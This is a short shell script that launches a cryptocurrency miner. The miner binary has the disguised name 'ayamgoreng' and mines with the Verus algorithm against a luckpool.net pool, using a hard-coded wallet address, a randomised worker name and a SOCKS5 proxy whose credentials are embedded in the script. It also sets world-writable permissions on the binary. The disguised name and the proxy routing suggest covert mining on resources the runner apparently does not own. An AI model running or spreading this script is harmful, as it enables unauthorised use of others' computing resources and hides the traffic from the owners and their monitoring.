chmod 777 ayamgoreng
apt install libjansson4 -y
PULL=stratum+tcp://na.luckpool.net:3956
WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
PRO=socks5://mike:mike@34.139.57.113:4145
./ayamgoreng -a verus -o $PULL -u $WUL.$WOR -p x -t 4 -x $PRO
